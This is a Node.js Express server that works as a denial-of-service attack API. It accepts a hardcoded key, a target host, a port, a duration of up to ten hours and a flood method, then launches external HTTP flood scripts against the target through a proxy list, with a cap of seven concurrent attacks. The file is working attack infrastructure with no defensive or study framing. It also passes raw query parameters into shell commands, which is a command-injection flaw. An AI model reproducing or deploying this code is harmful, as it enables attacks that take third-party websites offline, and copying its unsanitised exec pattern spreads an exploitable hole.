const express = require("express");
const app = express();
const port = 9998;
var exec = require("child_process").exec;

let activeAttacks = 0; 
const maxConcurrentAttacks = 7; 

app.get("/api/attack", (req, res) => {
  const clientIP =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const { key, host, time, method, port } = req.query;
  console.log(`IP Connect: ${clientIP}`);

  
  if (!key || !host || !time || !method || !port) {
    const err_u = {
      status: `error`,
      message: `Server url API : /api/attack?key=EnterYouKey&host={host}&port={port}&method={method}&time={time}`,
    };
    return res.status(400).send(err_u);
  }

  if (key !== "m85") {
    const err_key = {
      status: `error`,
      message: `Error Keys`,
    };
    return res.status(400).send(err_key);
  }

  if (time > 36001) {
    const err_time = {
      status: `error`,
      message: `Error Time < 36000 Second`,
    };
    return res.status(400).send(err_time);
  }

  if (port > 65535 || port < 1) {
    const err_port = {
      status: `error`,
      message: `Error Port`,
    };
    return res.status(400).send(err_port);
  }

  if (
    !(
      method.toLowerCase() === "httpflood" ||
      method.toLowerCase() === "httpbypass" ||
      method.toLowerCase() === "browser"
    )
  ) {
    const err_method = {
      status: `error`,
      method_valid: `Error Methods`,
      info: `https://t.me/m85power`,
    };
    return res.status(400).send(err_method);
  }

  
  if (activeAttacks >= maxConcurrentAttacks) {
    const err_attack_limit = {
      status: `error`,
      message: `Maximum number of concurrent attacks reached. Please try again later.`,
    };
    return res.status(400).send(err_attack_limit);
  }

  
  activeAttacks++;

  
  const jsonData = {
    status: `success`,
    message: `Send Attack Successful 1/1`,
    host: `${host}`,
    port: `${port}`,
    time: `${time}`,
    method: `${method}`,
  };
  res.status(200).send(jsonData);

  
  const executeCommand = (command, callback) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
      }
      console.log(`[${clientIP}] Command [${method}] executed successfully`);

      
      activeAttacks--;
      callback();
    });
  };

  if (method.toLowerCase() === "httpbypass") {
    executeCommand(`node bypass.js GET ${host} ${time} 8 5 proxy5.txt --debug --limit --ipv4 --connect --delay 10`, 
    () => {}
    );
  }

  if (method.toLowerCase() === "httpflood") {
    executeCommand(`node mega.js ${host} ${time} 60 20 proxy5.txt`, () => {});
  }

  if (method.toLowerCase() === "browser") {
    executeCommand(`node browser.js ${host} 5 proxy5.txt 34 ${time}`, () => {});
  }
});

app.listen(port, () => {
  console.log(`[API SERVER] running on http://localhost:${port}`);
});
